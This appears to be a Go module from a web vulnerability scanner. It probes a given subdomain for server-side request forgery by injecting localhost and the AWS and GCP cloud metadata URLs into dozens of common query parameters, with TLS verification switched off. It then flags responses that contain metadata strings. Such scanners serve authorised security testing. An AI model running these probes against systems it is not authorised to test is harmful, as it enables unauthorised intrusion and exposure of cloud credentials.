package ssrf

import (
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"
)

type Result struct {
	URL   string
	Param string
	Notes string
}

var httpClient = &http.Client{
	Timeout: 8 * time.Second,
	Transport: &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	},
	CheckRedirect: func(req *http.Request, via []*http.Request) error {
		return http.ErrUseLastResponse
	},
}

// Common parameters that might be used for SSRF
var ssrfParams = []string{
	"url", "uri", "path", "src", "dest", "redirect", "request",
	"image", "img", "file", "page", "feed", "host", "to",
	"out", "view", "dir", "show", "site", "val", "load",
	"callback", "next", "data", "reference", "ref", "target",
	"window", "link", "domain", "proxy", "forward",
}

// internal addresses to probe for SSRF
var ssrfTargets = []string{
	"http://127.0.0.1/",
	"http://169.254.169.254/latest/meta-data/", // AWS IMDSv1
	"http://metadata.google.internal/",          // GCP
}

// Check tests common SSRF parameters by injecting internal URLs and checking responses.
// Detects via: response size difference, status codes, content that looks like metadata.
func Check(subdomain string, timeout time.Duration) []Result {
	var results []Result

	for _, scheme := range []string{"https", "http"} {
		base := fmt.Sprintf("%s://%s", scheme, subdomain)

		// Get baseline response
		baseline, err := httpClient.Get(base)
		if err != nil {
			continue
		}
		baselineBody, _ := io.ReadAll(io.LimitReader(baseline.Body, 4096))
		baseline.Body.Close()
		baselineLen := len(baselineBody)

		for _, param := range ssrfParams {
			for _, target := range ssrfTargets {
				testURL := fmt.Sprintf("%s?%s=%s", base, param, target)
				resp, err := httpClient.Get(testURL)
				if err != nil {
					continue
				}
				body, _ := io.ReadAll(io.LimitReader(resp.Body, 8192))
				resp.Body.Close()
				bodyStr := string(body)

				// Heuristics: AWS metadata, GCP metadata, or significantly different response
				isSSRF := false
				notes := ""
				if strings.Contains(bodyStr, "ami-id") || strings.Contains(bodyStr, "instance-id") {
					isSSRF = true
					notes = "AWS IMDS metadata in response"
				} else if strings.Contains(bodyStr, "computeMetadata") || strings.Contains(bodyStr, "instance/service-accounts") {
					isSSRF = true
					notes = "GCP metadata in response"
				} else if resp.StatusCode == 200 && len(body) > 100 && len(body) != baselineLen {
					// Large response difference — possible SSRF
					notes = fmt.Sprintf("unusual response size (%d vs baseline %d)", len(body), baselineLen)
					// Only flag if response contains IP-like content or internal keywords
					if strings.Contains(bodyStr, "root:") || strings.Contains(bodyStr, "localhost") {
						isSSRF = true
					}
				}

				if isSSRF {
					results = append(results, Result{
						URL:   testURL,
						Param: param,
						Notes: notes,
					})
				}
			}
		}
		break
	}
	return results
}
